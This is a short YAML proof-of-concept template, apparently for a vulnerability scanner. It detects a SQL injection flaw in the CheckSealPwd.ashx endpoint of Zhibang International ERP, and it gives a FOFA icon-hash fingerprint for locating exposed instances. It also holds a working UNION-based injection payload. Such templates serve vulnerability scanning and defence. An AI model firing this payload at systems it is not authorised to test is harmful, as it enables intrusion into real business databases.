id: poc-yaml-zbintel-erp-checksealpwd-sqli
info:
  name: 智邦国际ERP CheckSealPwd SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 智邦国际ERP
  fofa: icon_hash="-682445886"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /SYSN/json/pcclient/CheckSealPwd.ashx?id=1+UNION+ALL+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--
  expression: status_code == 200 && contains(body,"SystemErrorSign") && contains(body,"0x"
    + t2) && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
transport: http
